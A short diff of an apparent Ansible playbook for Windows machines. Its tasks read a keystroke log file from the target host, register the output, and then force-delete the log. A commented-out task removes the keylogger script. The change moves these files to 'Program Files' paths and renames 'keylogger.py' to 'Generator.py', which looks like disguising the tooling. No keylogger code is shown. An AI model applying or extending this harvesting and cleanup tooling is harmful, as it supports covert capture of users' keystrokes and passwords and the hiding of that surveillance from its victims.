@@ -11,8 +11,8 @@
 
     - name: Attempt to read keylog.txt (to check if it exists)
       win_shell: |
-        if (Test-Path -Path "C:\Users\{{ ansible_user }}\Videos\\random.txt") {
-          Get-Content -Path "C:\Users\{{ ansible_user }}\Videos\\random.txt"
+        if (Test-Path -Path "C:\\Program Files\\random.txt") {
+          Get-Content -Path "C:\\Program Files\\random.txt"
         }
       register: keylog_output
 
@@ -23,13 +23,13 @@
 
     - name: Remove the log file from the Windows machine (if it exists)
       win_shell: |
-        if (Test-Path -Path "C:\Users\{{ ansible_user }}\Videos\\random.txt") {
-          Remove-Item -Path "C:\Users\{{ ansible_user }}\Videos\\random.txt" -Force
+        if (Test-Path -Path "C:\\Program Files\\random.txt") {
+          Remove-Item -Path "C:\\Program Files\\random.txt" -Force
         }
       when: keylog_output.stdout is defined and keylog_output.stdout != ''
 
 #    - name: Remove keylogger.py from the Windows machine (if it exists)
 #      win_shell: |
-#        if (Test-Path -Path "C:\Users\{{ ansible_user }}\Videos\keylogger.py") {
-#          Remove-Item -Path "C:\Users\{{ ansible_user }}\Videos\keylogger.py" -Force
+#        if (Test-Path -Path "C:\Program Files\Generator.py") {
+#          Remove-Item -Path "C:\Program Files\Generator.py" -Force
 #        }
